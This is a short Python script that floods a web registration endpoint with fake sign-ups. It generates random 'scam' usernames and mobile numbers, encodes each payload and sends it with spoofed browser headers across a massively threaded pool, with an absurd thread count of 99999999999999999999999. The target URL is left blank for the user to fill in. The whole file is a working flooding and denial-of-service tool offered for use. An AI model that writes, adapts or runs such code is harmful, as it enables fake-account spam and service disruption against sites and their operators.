import requests
import base64
import random
import json
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import os,threading

successful_requests = 0

def generate_random_username():
    return f"scam{random.randint(1000, 9999)}"

def generate_random_mobile():
    return f"98{random.randint(10000000, 99999999)}"

def create_payload():
    payload = {
        "username": generate_random_username(),
        "mobile": generate_random_mobile(),
        "password": "scam",
        "inviter": "114563",
        "machine": "17204265160908750676"
    }
    return payload

def encode_payload(payload):
    json_str = json.dumps(payload)
    url_encoded_str = urllib.parse.quote(json_str)
    base64_encoded_str = base64.b64encode(url_encoded_str.encode('utf-8')).decode('utf-8')
    return base64_encoded_str

def send_request(session):
    global successful_requests
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'access-control-allow-origin': '*',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'token': '',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    }

    payload = create_payload()
    encoded_data = encode_payload(payload)
    
    data = {
        'data': encoded_data,
    }

    response = session.post('https://', headers=headers, data=data) #Enter Own URL
    response_code = response.status_code
    if response_code == 200:
        with threading.Lock():
            successful_requests += 1
            print(f"Request sent successfully {successful_requests}")
    else:
        print(f"Request failed. Response: {response_code}")

def threads(num_threads):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        with requests.Session() as session:
            futures = [executor.submit(send_request, session) for _ in range(num_threads)]
            for future in futures:
                future.result()

num_threads = 99999999999999999999999

threads(num_threads)
